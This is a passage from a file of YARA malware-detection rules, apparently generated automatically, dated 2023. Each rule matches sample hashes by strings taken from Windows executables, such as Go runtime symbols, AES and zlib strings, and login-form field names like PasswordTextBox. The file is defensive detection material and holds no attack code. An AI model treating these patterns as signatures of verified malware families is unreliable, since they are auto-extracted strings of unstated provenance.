      hash1 = "5b4fa424c04f0c0b46e27d6d91726c5cb53f515fc6e039776879f4407502a0f9"
      hash2 = "2be8c5227ce43f5f92291200b651a468b8ee36ea00c7f1f7f0d7579a7de61b43"
   strings:
      $s1 = ".?AVCommonError@@" fullword ascii /* score: '10.00'*/
      $s2 = "inBuffer::get_8: noenough " fullword ascii /* score: '9.00'*/
      $s3 = "unpack error not enough " fullword ascii /* score: '9.00'*/
      $s4 = "memory alloc error @9" fullword ascii /* score: '7.00'*/
      $s5 = "alloc error @10" fullword ascii /* score: '7.00'*/
      $s6 = "alloc error @12" fullword ascii /* score: '7.00'*/
      $s7 = " inflate 1.2.11 Copyright 1995-2017 Mark Adler " fullword ascii /* score: '6.00'*/
      $s8 = "unknown compression method" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.50'*/ /* Goodware String - occured 498 times */
      $s9 = "D$09D$,v" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s10 = "HkD$( H" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s11 = "H9D$0skH" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s12 = "D$xHkL$( H" fullword ascii /* score: '4.00'*/
      $s13 = "HkD$@ H" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s14 = "D$`9D$ v" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s15 = "inBuffer unpack:  buffer size to small" fullword ascii /* score: '4.00'*/
      $s16 = "WHkD$8 H" fullword ascii /* score: '4.00'*/
      $s17 = "H+D$8H;" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s18 = "D$@9D$Dv" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s19 = "D$PH9D$ v" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s20 = "D$XH9D$0s" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
   condition:
      ( uint16(0) == 0x5a4d and filesize < 1000KB and ( 8 of them )
      ) or ( all of them )
}

rule _f3ba7589f1ca3fb4c27934e454016e4fb162fc6de31ed20bdb8dcfbed077b0d0_2278958c65c42569a501f2bc22b6ff070622843ebeccf2a914de5fd7b4_24 {
   meta:
      description = "dataset - from files f3ba7589f1ca3fb4c27934e454016e4fb162fc6de31ed20bdb8dcfbed077b0d0, 2278958c65c42569a501f2bc22b6ff070622843ebeccf2a914de5fd7b4bafd03, 7875c40a3b6e223df3f34a081d1fe418d84cc1c14b49aa5e4ec184279167467b"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "f3ba7589f1ca3fb4c27934e454016e4fb162fc6de31ed20bdb8dcfbed077b0d0"
      hash2 = "2278958c65c42569a501f2bc22b6ff070622843ebeccf2a914de5fd7b4bafd03"
      hash3 = "7875c40a3b6e223df3f34a081d1fe418d84cc1c14b49aa5e4ec184279167467b"
   strings:
      $s1 = "tQfD9 tK" fullword ascii /* score: '4.00'*/
      $s2 = "f9t$bu" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s3 = "tU;\\$0tH" fullword ascii /* score: '1.00'*/
      $s4 = "9Cu,fD9y" fullword ascii /* score: '1.00'*/
      $s5 = "fD94iu" fullword ascii /* score: '1.00'*/ /* Goodware String - occured 4 times */
      $s6 = "t$`fD9+t$I" fullword ascii /* score: '1.00'*/
      $s7 = "f9)u:H" fullword ascii /* score: '1.00'*/
      $s8 = "t'D8d$8t" fullword ascii /* score: '1.00'*/
      $s9 = "?D8d$8t" fullword ascii /* score: '1.00'*/
      $s10 = "%D8d$8t" fullword ascii /* score: '1.00'*/
      $s11 = "H9L$Ht?H" fullword ascii /* score: '1.00'*/
      $s12 = "D$h9t$P" fullword ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and ( 8 of them )
      ) or ( all of them )
}

rule _0d032d82dec12b4c35e2724d09ef23f517ee839efd673b26a28cec732ddce343_d6a1fddbde5dc3a875d1f31fd0bbd77d0e3d4307724f298015923a5763_25 {
   meta:
      description = "dataset - from files 0d032d82dec12b4c35e2724d09ef23f517ee839efd673b26a28cec732ddce343, d6a1fddbde5dc3a875d1f31fd0bbd77d0e3d4307724f298015923a5763cbfe3f"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "0d032d82dec12b4c35e2724d09ef23f517ee839efd673b26a28cec732ddce343"
      hash2 = "d6a1fddbde5dc3a875d1f31fd0bbd77d0e3d4307724f298015923a5763cbfe3f"
   strings:
      $s1 = "get_LogoPictureBox" fullword ascii /* score: '14.00'*/
      $s2 = "get_UsernameLabel" fullword ascii /* score: '12.00'*/
      $s3 = "PasswordTextBox" fullword wide /* score: '12.00'*/
      $s4 = "get_UsernameTextBox" fullword ascii /* score: '12.00'*/
      $s5 = "LogoPictureBox" fullword wide /* score: '9.00'*/
      $s6 = "get_GroupBox1" fullword ascii /* score: '9.00'*/
      $s7 = "get_TextBox1" fullword ascii /* score: '9.00'*/
      $s8 = "get_FileToolStripMenuItem" fullword ascii /* score: '9.00'*/
      $s9 = "get_MenuStrip1" fullword ascii /* score: '9.00'*/
      $s10 = "set_LogoPictureBox" fullword ascii /* score: '9.00'*/
      $s11 = "get_NumericUpDown1" fullword ascii /* score: '9.00'*/
      $s12 = "get_ExitToolStripMenuItem" fullword ascii /* score: '9.00'*/
      $s13 = "UsernameLabel" fullword wide /* score: '7.00'*/
      $s14 = "set_UsernameLabel" fullword ascii /* score: '7.00'*/
      $s15 = "UsernameTextBox" fullword wide /* score: '7.00'*/
      $s16 = "set_UsernameTextBox" fullword ascii /* score: '7.00'*/
      $s17 = "&User name" fullword wide /* score: '7.00'*/
      $s18 = "get_Label8" fullword ascii /* score: '6.00'*/
      $s19 = "get_Label2" fullword ascii /* score: '6.00'*/
      $s20 = "get_Label5" fullword ascii /* score: '6.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and ( 8 of them )
      ) or ( all of them )
}

rule _78a59f5c6d8cd3f3cf0e70b565c8038844b34cba3e99b3fc63908821bdadce35_b4cfc49d647ebeffb99579dbd4be2a4ca779e3d36b60656aaa9d616ac3_26 {
   meta:
      description = "dataset - from files 78a59f5c6d8cd3f3cf0e70b565c8038844b34cba3e99b3fc63908821bdadce35, b4cfc49d647ebeffb99579dbd4be2a4ca779e3d36b60656aaa9d616ac343e991, cd8256d1c896a8de9ccf50e26f97106295f4e664aef6ba3ee0883420c01ac374"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "78a59f5c6d8cd3f3cf0e70b565c8038844b34cba3e99b3fc63908821bdadce35"
      hash2 = "b4cfc49d647ebeffb99579dbd4be2a4ca779e3d36b60656aaa9d616ac343e991"
      hash3 = "cd8256d1c896a8de9ccf50e26f97106295f4e664aef6ba3ee0883420c01ac374"
   strings:
      $s1 = "sync.(*RWMutex).Unlock" fullword ascii /* score: '15.00'*/
      $s2 = "sync.(*RWMutex).Lock" fullword ascii /* score: '15.00'*/
      $s3 = "internal/testlog.Getenv" fullword ascii /* score: '14.00'*/
      $s4 = "runtime.selparkcommit" fullword ascii /* score: '13.00'*/
      $s5 = "reflect.(*ptrType).Comparable" fullword ascii /* score: '11.00'*/
      $s6 = "reflect.(*funcType).Comparable" fullword ascii /* score: '11.00'*/
      $s7 = "strings.ContainsRune" fullword ascii /* score: '10.00'*/
      $s8 = "runtime.selectgo.func2" fullword ascii /* score: '10.00'*/
      $s9 = "runtime.(*hchan).sortkey" fullword ascii /* score: '10.00'*/
      $s10 = "runtime.selunlock" fullword ascii /* score: '10.00'*/
      $s11 = "runtime.sellock" fullword ascii /* score: '10.00'*/
      $s12 = "runtime.selectgo" fullword ascii /* score: '10.00'*/
      $s13 = "runtime.selectnbrecv" fullword ascii /* score: '10.00'*/
      $s14 = "strings.IndexRune" fullword ascii /* score: '10.00'*/
      $s15 = "strings.Map" fullword ascii /* score: '10.00'*/
      $s16 = "runtime.convT2I" fullword ascii /* score: '10.00'*/
      $s17 = "unicode/utf8.DecodeLastRuneInString" fullword ascii /* score: '9.00'*/
      $s18 = "syscall.Getenv" fullword ascii /* score: '8.00'*/
      $s19 = "syscall.GetEnvironmentVariable" fullword ascii /* score: '8.00'*/
      $s20 = "lockorder" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 19000KB and ( 8 of them )
      ) or ( all of them )
}

rule _d2ec6b7a4c7d661c0aba50ffdf9d2bb1b50392d1a5ce30dde75dee9c36341a91_61dc296d1b2aa4724f3b0a44a53863613d61df9de4ee8e0a01f2d33b80_27 {
   meta:
      description = "dataset - from files d2ec6b7a4c7d661c0aba50ffdf9d2bb1b50392d1a5ce30dde75dee9c36341a91, 61dc296d1b2aa4724f3b0a44a53863613d61df9de4ee8e0a01f2d33b80169a4d"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "d2ec6b7a4c7d661c0aba50ffdf9d2bb1b50392d1a5ce30dde75dee9c36341a91"
      hash2 = "61dc296d1b2aa4724f3b0a44a53863613d61df9de4ee8e0a01f2d33b80169a4d"
   strings:
      $s1 = "|$Xt=H" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s2 = "Copyright (C) 2004" fullword wide /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s3 = "(_^][I" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s4 = "f:\\rtm\\vctools\\vc7libs\\ship\\atlmfc\\include\\afxwin2.inl" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s5 = "H9A8t$H" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s6 = "\\$PtHH" fullword ascii /* score: '2.00'*/
      $s7 = "T$HtNL" fullword ascii /* score: '1.00'*/
      $s8 = "tBH9x@u." fullword ascii /* score: '1.00'*/
      $s9 = "d$ x+H" fullword ascii /* score: '1.00'*/
      $s10 = " A^A]A\\_^][" fullword ascii /* score: '1.00'*/
      $s11 = " A\\_^][" fullword ascii /* score: '1.00'*/
      $s12 = "H9YXuL" fullword ascii /* score: '1.00'*/
      $s13 = "D$Pt1H" fullword ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 1000KB and ( 8 of them )
      ) or ( all of them )
}

rule _8232f63ec9d5569b492e04eba453162076fd79ab634dca162faa664a1a75d3ad_487424f7ad546f72d0240922d1c6d9800bfcb95d3582eeecbbae005120_28 {
   meta:
      description = "dataset - from files 8232f63ec9d5569b492e04eba453162076fd79ab634dca162faa664a1a75d3ad, 487424f7ad546f72d0240922d1c6d9800bfcb95d3582eeecbbae0051208b6f89, 83f06213409abbf39756e856aea050e2b7b40b0c488ac6b966b15cbb2ec1e5fc, 7cd70b5e3a4e9faba7aee9b0a0784d61ed804096f834c773e8357efcdc8be966, 4754626f12467f7a14731030afe57b3ffe6bac1c1a8d2d93a027f0cec5be08e7, 78a59f5c6d8cd3f3cf0e70b565c8038844b34cba3e99b3fc63908821bdadce35, 89cb65bfaf8e7cb59a35bca859df284488f1f2264a4845c3bfcf4f82b3c3fcdd, cd8256d1c896a8de9ccf50e26f97106295f4e664aef6ba3ee0883420c01ac374"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "8232f63ec9d5569b492e04eba453162076fd79ab634dca162faa664a1a75d3ad"
      hash2 = "487424f7ad546f72d0240922d1c6d9800bfcb95d3582eeecbbae0051208b6f89"
      hash3 = "83f06213409abbf39756e856aea050e2b7b40b0c488ac6b966b15cbb2ec1e5fc"
      hash4 = "7cd70b5e3a4e9faba7aee9b0a0784d61ed804096f834c773e8357efcdc8be966"
      hash5 = "4754626f12467f7a14731030afe57b3ffe6bac1c1a8d2d93a027f0cec5be08e7"
      hash6 = "78a59f5c6d8cd3f3cf0e70b565c8038844b34cba3e99b3fc63908821bdadce35"
      hash7 = "89cb65bfaf8e7cb59a35bca859df284488f1f2264a4845c3bfcf4f82b3c3fcdd"
      hash8 = "cd8256d1c896a8de9ccf50e26f97106295f4e664aef6ba3ee0883420c01ac374"
   strings:
      $s1 = "= flushGen  gfreecnt= pages at  runqsize= runqueue= s.base()= spinning= stopwait= sweepgen  sweepgen= targetpc= throwing= until " ascii /* score: '22.00'*/
      $s2 = "bytes.Buffer: reader returned negative count from ReadgcControllerState.findRunnable: blackening not enabledinternal error: poll" ascii /* score: '13.00'*/
      $s3 = "*aes.KeySizeError" fullword ascii /* score: '10.00'*/
      $s4 = "crypto/aes.(*KeySizeError).Error" fullword ascii /* score: '10.00'*/
      $s5 = "crypto/aes.KeySizeError.Error" fullword ascii /* score: '10.00'*/
      $s6 = "os.statNolog" fullword ascii /* score: '9.00'*/
      $s7 = "os.openFileNolog" fullword ascii /* score: '9.00'*/
      $s8 = "internal/testlog.Stat" fullword ascii /* score: '9.00'*/
      $s9 = "internal/testlog.Open" fullword ascii /* score: '9.00'*/
      $s10 = "os.newFileStatFromGetFileInformationByHandle" fullword ascii /* score: '9.00'*/
      $s11 = "syscall.GetFileAttributesEx" fullword ascii /* score: '8.00'*/
      $s12 = "syscall.GetFileInformationByHandle" fullword ascii /* score: '8.00'*/
      $s13 = "syscall.GetFullPathName" fullword ascii /* score: '8.00'*/
      $s14 = "encoding/hex.InvalidByteError.Error" fullword ascii /* score: '7.00'*/
      $s15 = "_expand_key_256a" fullword ascii /* score: '7.00'*/
      $s16 = "_expand_key_192b" fullword ascii /* score: '7.00'*/
      $s17 = "*hex.InvalidByteError" fullword ascii /* score: '7.00'*/
      $s18 = "_expand_key_128" fullword ascii /* score: '7.00'*/
      $s19 = "crypto/aes.expandKeyGo" fullword ascii /* score: '7.00'*/
      $s20 = "_expand_key_256b" fullword ascii /* score: '7.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 19000KB and ( 8 of them )
      ) or ( all of them )
}

rule _8232f63ec9d5569b492e04eba453162076fd79ab634dca162faa664a1a75d3ad_487424f7ad546f72d0240922d1c6d9800bfcb95d3582eeecbbae005120_29 {
   meta:
      description = "dataset - from files 8232f63ec9d5569b492e04eba453162076fd79ab634dca162faa664a1a75d3ad, 487424f7ad546f72d0240922d1c6d9800bfcb95d3582eeecbbae0051208b6f89, 83f06213409abbf39756e856aea050e2b7b40b0c488ac6b966b15cbb2ec1e5fc, 7cd70b5e3a4e9faba7aee9b0a0784d61ed804096f834c773e8357efcdc8be966, 4754626f12467f7a14731030afe57b3ffe6bac1c1a8d2d93a027f0cec5be08e7, 78a59f5c6d8cd3f3cf0e70b565c8038844b34cba3e99b3fc63908821bdadce35, 89cb65bfaf8e7cb59a35bca859df284488f1f2264a4845c3bfcf4f82b3c3fcdd, b4cfc49d647ebeffb99579dbd4be2a4ca779e3d36b60656aaa9d616ac343e991"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "8232f63ec9d5569b492e04eba453162076fd79ab634dca162faa664a1a75d3ad"
      hash2 = "487424f7ad546f72d0240922d1c6d9800bfcb95d3582eeecbbae0051208b6f89"
      hash3 = "83f06213409abbf39756e856aea050e2b7b40b0c488ac6b966b15cbb2ec1e5fc"
      hash4 = "7cd70b5e3a4e9faba7aee9b0a0784d61ed804096f834c773e8357efcdc8be966"
      hash5 = "4754626f12467f7a14731030afe57b3ffe6bac1c1a8d2d93a027f0cec5be08e7"
      hash6 = "78a59f5c6d8cd3f3cf0e70b565c8038844b34cba3e99b3fc63908821bdadce35"
      hash7 = "89cb65bfaf8e7cb59a35bca859df284488f1f2264a4845c3bfcf4f82b3c3fcdd"
      hash8 = "b4cfc49d647ebeffb99579dbd4be2a4ca779e3d36b60656aaa9d616ac343e991"
   strings:
      $s1 = "internal/poll.(*fdMutex).incref" fullword ascii /* score: '15.00'*/
      $s2 = "runtime.mapassign_fast64" fullword ascii /* score: '13.00'*/
      $s3 = "DecodedLen" fullword ascii /* score: '11.00'*/
      $s4 = "encoding/base64.(*Encoding).DecodedLen" fullword ascii /* score: '11.00'*/
      $s5 = "runtime.convI2I" fullword ascii /* score: '10.00'*/
      $s6 = "compress/flate.(*hcode).set" fullword ascii /* score: '10.00'*/
      $s7 = "compress/flate.(*byLiteral).Len" fullword ascii /* score: '10.00'*/
      $s8 = "compress/flate.byLiteral.Len" fullword ascii /* score: '10.00'*/
      $s9 = "compress/flate.byFreq.Len" fullword ascii /* score: '10.00'*/
      $s10 = "compress/flate.(*byFreq).Len" fullword ascii /* score: '10.00'*/
      $s11 = "EncodedLen" fullword ascii /* score: '9.00'*/
      $s12 = "encoding/base64.(*CorruptInputError).Error" fullword ascii /* score: '7.00'*/
      $s13 = "sort.heapSort" fullword ascii /* score: '7.00'*/
      $s14 = "bufio.init" fullword ascii /* score: '7.00'*/
      $s15 = "compress/flate.newHuffmanEncoder" fullword ascii /* score: '7.00'*/
      $s16 = "encoding/base64.CorruptInputError.Error" fullword ascii /* score: '7.00'*/
      $s17 = "compress/flate.reverseBits" fullword ascii /* score: '7.00'*/
      $s18 = "sort.maxDepth" fullword ascii /* score: '7.00'*/
      $s19 = "compress/flate.(*byLiteral).Less" fullword ascii /* score: '7.00'*/
      $s20 = "fmt.Errorf" fullword ascii /* score: '7.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 19000KB and ( 8 of them )
      ) or ( all of them )
}

rule _7920fb3873012f1abef8c2abfb905e53317595874985f24b23fb318b54b1e243_a9d94d703fc37de592e1d5bfffed76e199ac21bd67bfdc8aee7325a43d_30 {
   meta:
      description = "dataset - from files 7920fb3873012f1abef8c2abfb905e53317595874985f24b23fb318b54b1e243, a9d94d703fc37de592e1d5bfffed76e199ac21bd67bfdc8aee7325a43d847583"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "7920fb3873012f1abef8c2abfb905e53317595874985f24b23fb318b54b1e243"
      hash2 = "a9d94d703fc37de592e1d5bfffed76e199ac21bd67bfdc8aee7325a43d847583"
   strings:
      $s1 = "w(D9t$(t" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s2 = "(LcD$@L" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s3 = "System" fullword wide /* PEStudio Blacklist: strings */ /* score: '3.18'*/ /* Goodware String - occured 1819 times */
      $s4 = "D$HLcL$HHcT$8L" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s5 = "(LcL$HI" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s6 = "fD9#thH" fullword ascii /* score: '0.00'*/ /* Goodware String - occured 5 times */
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and ( all of them )
      ) or ( all of them )
}

rule _7cd70b5e3a4e9faba7aee9b0a0784d61ed804096f834c773e8357efcdc8be966_89cb65bfaf8e7cb59a35bca859df284488f1f2264a4845c3bfcf4f82b3_31 {
   meta:
      description = "dataset - from files 7cd70b5e3a4e9faba7aee9b0a0784d61ed804096f834c773e8357efcdc8be966, 89cb65bfaf8e7cb59a35bca859df284488f1f2264a4845c3bfcf4f82b3c3fcdd, b4cfc49d647ebeffb99579dbd4be2a4ca779e3d36b60656aaa9d616ac343e991"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "7cd70b5e3a4e9faba7aee9b0a0784d61ed804096f834c773e8357efcdc8be966"
      hash2 = "89cb65bfaf8e7cb59a35bca859df284488f1f2264a4845c3bfcf4f82b3c3fcdd"
      hash3 = "b4cfc49d647ebeffb99579dbd4be2a4ca779e3d36b60656aaa9d616ac343e991"
   strings:
      $s1 = "f*struct { F uintptr; size uintptr; align uintptr; sysStat *runtime.sysMemStat; p **runtime.notInHeap }" fullword ascii /* score: '11.00'*/
      $s2 = "*runtime.sysMemStat" fullword ascii /* score: '11.00'*/
      $s3 = "checkmarks" fullword ascii /* score: '8.00'*/
      $s4 = "(*struct { F uintptr; freem **runtime.m }" fullword ascii /* score: '7.00'*/
      $s5 = "6*[]struct { mcentral runtime.mcentral; pad [24]uint8 }" fullword ascii /* score: '7.00'*/
      $s6 = "*runtime.checkmarksMap" fullword ascii /* score: '7.00'*/
      $s7 = "+*struct { F uintptr; p *runtime.pageAlloc }" fullword ascii /* score: '7.00'*/
      $s8 = "3*struct { F uintptr; gp *runtime.g; pp *runtime.p }" fullword ascii /* score: '7.00'*/
      $s9 = "=*struct { F uintptr; p *runtime.pageAlloc; minPages uintptr }" fullword ascii /* score: '7.00'*/
      $s10 = "4*struct { mcentral runtime.mcentral; pad [24]uint8 }" fullword ascii /* score: '7.00'*/
      $s11 = "9*[136]struct { mcentral runtime.mcentral; pad [24]uint8 }" fullword ascii /* score: '7.00'*/
      $s12 = "type..eq.struct { runtime.mcentral runtime.mcentral; runtime.pad [24]uint8 }" fullword ascii /* score: '5.00'*/
      $s13 = "type..eq.[136]struct { runtime.mcentral runtime.mcentral; runtime.pad [24]uint8 }" fullword ascii /* score: '5.00'*/
      $s14 = "N+* )A" fullword ascii /* score: '5.00'*/
      $s15 = "L$HHcT$0H" fullword ascii /* score: '4.00'*/
      $s16 = "memprofiH92u" fullword ascii /* score: '4.00'*/
      $s17 = "H8H9J8" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s18 = "\\$`H9S@~" fullword ascii /* score: '2.00'*/
      $s19 = "T$08J+t" fullword ascii /* score: '1.00'*/
      $s20 = "H9A8u)H" fullword ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 8000KB and ( 8 of them )
      ) or ( all of them )
}

rule _d90514c5b26e568a6d51eec779bd3bea328b890efc00aa179f8edd617754a802_ee42ddacbd202008bcc1312e548e1d9ac670dd3d86c999606a3a01d464_32 {
   meta:
      description = "dataset - from files d90514c5b26e568a6d51eec779bd3bea328b890efc00aa179f8edd617754a802, ee42ddacbd202008bcc1312e548e1d9ac670dd3d86c999606a3a01d464a2a330, ee44c0692fd2ab2f01d17ca4b58ca6c7f79388cbc681f885bb17ec946514088c"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "d90514c5b26e568a6d51eec779bd3bea328b890efc00aa179f8edd617754a802"
      hash2 = "ee42ddacbd202008bcc1312e548e1d9ac670dd3d86c999606a3a01d464a2a330"
      hash3 = "ee44c0692fd2ab2f01d17ca4b58ca6c7f79388cbc681f885bb17ec946514088c"
   strings:
      $s1 = "bin\\amd64\\MSPDB110.DLL" fullword wide /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s2 = "SOFTWARE\\Wow6432Node\\Microsoft\\VisualStudio\\11.0\\Setup\\VC" fullword wide /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s3 = "}}}}cc" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s4 = "./.,.,." fullword ascii /* score: '1.00'*/
      $s5 = "./.,./." fullword ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 5000KB and ( all of them )
      ) or ( all of them )
}

rule _132bdcb986e3e3b9599b5b293b3318e7c630495e87a9d1fa02287ae80f9e652f_7920fb3873012f1abef8c2abfb905e53317595874985f24b23fb318b54_33 {
   meta:
      description = "dataset - from files 132bdcb986e3e3b9599b5b293b3318e7c630495e87a9d1fa02287ae80f9e652f, 7920fb3873012f1abef8c2abfb905e53317595874985f24b23fb318b54b1e243, e5bb8537cc3a7cb763ac60ab6efb0d11844d34bec9ef28b9052fdad920f07076, 2cb4d628278053eba42c82d58fb894c230451ffe70d519ff79c5f1cc76f32fd9, a9d94d703fc37de592e1d5bfffed76e199ac21bd67bfdc8aee7325a43d847583, 1c8de01df040c973b37ae5ce8e1bb523e1ba24a9c25263706022f9a9894a2e50"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "132bdcb986e3e3b9599b5b293b3318e7c630495e87a9d1fa02287ae80f9e652f"
      hash2 = "7920fb3873012f1abef8c2abfb905e53317595874985f24b23fb318b54b1e243"
      hash3 = "e5bb8537cc3a7cb763ac60ab6efb0d11844d34bec9ef28b9052fdad920f07076"
      hash4 = "2cb4d628278053eba42c82d58fb894c230451ffe70d519ff79c5f1cc76f32fd9"
      hash5 = "a9d94d703fc37de592e1d5bfffed76e199ac21bd67bfdc8aee7325a43d847583"
      hash6 = "1c8de01df040c973b37ae5ce8e1bb523e1ba24a9c25263706022f9a9894a2e50"
   strings:
      $s1 = " A]A\\_" fullword ascii /* score: '1.00'*/
      $s2 = "T$PD+T$XD" fullword ascii /* score: '0.00'*/ /* Goodware String - occured 5 times */
      $s3 = "f99t*H" fullword ascii /* score: '0.00'*/ /* Goodware String - occured 5 times */
      $s4 = "T$HD;T$@C" fullword ascii /* score: '0.00'*/ /* Goodware String - occured 5 times */
      $s5 = "f99t%H" fullword ascii /* score: '0.00'*/ /* Goodware String - occured 5 times */
      $s6 = "@8x(u<H" fullword ascii /* score: '0.00'*/ /* Goodware String - occured 5 times */
      $s7 = "D$XD+D$PD" fullword ascii /* score: '0.00'*/ /* Goodware String - occured 5 times */
      $s8 = "LT$@;D$L~" fullword ascii /* score: '0.00'*/ /* Goodware String - occured 5 times */
      $s9 = "fD9\"t!H" fullword ascii /* score: '0.00'*/ /* Goodware String - occured 5 times */
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and ( all of them )
      ) or ( all of them )
}

rule _f3ba7589f1ca3fb4c27934e454016e4fb162fc6de31ed20bdb8dcfbed077b0d0_1fb13a158aff3d258b8f62fe211fabeed03f0763b2acadbccad9e8e399_34 {
   meta:
      description = "dataset - from files f3ba7589f1ca3fb4c27934e454016e4fb162fc6de31ed20bdb8dcfbed077b0d0, 1fb13a158aff3d258b8f62fe211fabeed03f0763b2acadbccad9e8e39969ea00, 2278958c65c42569a501f2bc22b6ff070622843ebeccf2a914de5fd7b4bafd03"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "f3ba7589f1ca3fb4c27934e454016e4fb162fc6de31ed20bdb8dcfbed077b0d0"
      hash2 = "1fb13a158aff3d258b8f62fe211fabeed03f0763b2acadbccad9e8e39969ea00"
      hash3 = "2278958c65c42569a501f2bc22b6ff070622843ebeccf2a914de5fd7b4bafd03"
   strings:
      $s1 = "wrong protocol type" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 567 times */
      $s2 = "network down" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 567 times */
      $s3 = "connection already in progress" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 567 times */
      $s4 = "network reset" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 567 times */
      $s5 = "owner dead" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 567 times */
      $s6 = "connection aborted" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 568 times */
      $s7 = "protocol not supported" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 568 times */
      $s8 = "network unreachable" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 569 times */
      $s9 = "host unreachable" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 571 times */
      $s10 = "protocol error" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.41'*/ /* Goodware String - occured 588 times */
      $s11 = "permission denied" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.41'*/ /* Goodware String - occured 592 times */
      $s12 = "connection refused" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.40'*/ /* Goodware String - occured 597 times */
      $s13 = "broken pipe" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.37'*/ /* Goodware String - occured 635 times */
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x534d ) and filesize < 6000KB and ( 8 of them )
      ) or ( all of them )
}

rule _132bdcb986e3e3b9599b5b293b3318e7c630495e87a9d1fa02287ae80f9e652f_e5bb8537cc3a7cb763ac60ab6efb0d11844d34bec9ef28b9052fdad920_35 {
   meta:
      description = "dataset - from files 132bdcb986e3e3b9599b5b293b3318e7c630495e87a9d1fa02287ae80f9e652f, e5bb8537cc3a7cb763ac60ab6efb0d11844d34bec9ef28b9052fdad920f07076, 2cb4d628278053eba42c82d58fb894c230451ffe70d519ff79c5f1cc76f32fd9, 1c8de01df040c973b37ae5ce8e1bb523e1ba24a9c25263706022f9a9894a2e50"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "132bdcb986e3e3b9599b5b293b3318e7c630495e87a9d1fa02287ae80f9e652f"
      hash2 = "e5bb8537cc3a7cb763ac60ab6efb0d11844d34bec9ef28b9052fdad920f07076"
      hash3 = "2cb4d628278053eba42c82d58fb894c230451ffe70d519ff79c5f1cc76f32fd9"
      hash4 = "1c8de01df040c973b37ae5ce8e1bb523e1ba24a9c25263706022f9a9894a2e50"
   strings:
      $s1 = "w(D9t$8" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s2 = "@8|$HtcH" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s3 = "f9D$HrA" fullword ascii /* score: '1.00'*/
      $s4 = ".D8l$Ht" fullword ascii /* score: '1.00'*/ /* Goodware String - occured 4 times */
      $s5 = "AfxOleControl90s" fullword ascii /* score: '0.00'*/ /* Goodware String - occured 5 times */
